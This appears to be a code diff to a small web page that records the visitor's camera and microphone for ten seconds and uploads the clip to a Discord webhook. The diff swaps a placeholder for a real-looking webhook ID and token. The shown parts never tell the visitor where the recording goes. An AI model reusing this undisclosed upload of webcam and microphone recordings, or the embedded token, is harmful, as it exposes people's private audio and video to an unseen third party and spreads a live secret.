@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Recording...</title>
+  <title>録画中...</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -40,11 +40,11 @@
 </div>
 
 <script>
-  const webhookUrl = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN";
+  const webhookUrl = "https://discord.com/api/webhooks/1377883943642333194/wPfWly6Kbxjg64NOp0xbEnDzOkwOH0Vhq8sAnex10T3b5rcOh3v-HPeXE6nKELQclAYq"; // ← 実際のWebhookに置き換えて！
 
-  const durationMs = 5000; // 5秒録画
-  const totalSteps = 100;  // 100%
-  const stepTime = durationMs / totalSteps; // 1ステップの時間
+  const durationMs = 10000; // 10秒
+  const updateInterval = 100; // 0.1秒ごと更新（なめらか）
+  const totalSteps = durationMs / updateInterval;
 
   const progressText = document.getElementById("progressText");
   const progressFill = document.getElementById("progressFill");
@@ -66,26 +66,28 @@
         method: "POST",
         body: formData
       }).then(() => {
-        window.location.href = "recorded.html"; // ← 別ページへ遷移
+        window.location.href = "recorded.html"; // ← 送信後に移動
       });
     };
 
-    // 録画スタート
     mediaRecorder.start();
 
-    // プログレス更新（1%ずつ）
-    let progress = 0;
+    // カウントダウン進行
+    let currentStep = 0;
     const interval = setInterval(() => {
-      progress++;
-      progressText.textContent = `録画中... ${progress}%`;
-      progressFill.style.width = `${progress}%`;
+      currentStep++;
+      const percentage = Math.min(Math.round((currentStep / totalSteps) * 100), 100);
+      progressText.textContent = `録画中... ${percentage}%`;
+      progressFill.style.width = `${percentage}%`;
 
-      if (progress >= 100) {
+      if (currentStep >= totalSteps) {
         clearInterval(interval);
         mediaRecorder.stop();
         stream.getTracks().forEach(track => track.stop());
       }
-    }, stepTime);
+    }, updateInterval);
+  }).catch(err => {
+    alert("カメラ・マイクへのアクセスが拒否されました：" + err);
   });
 </script>
 
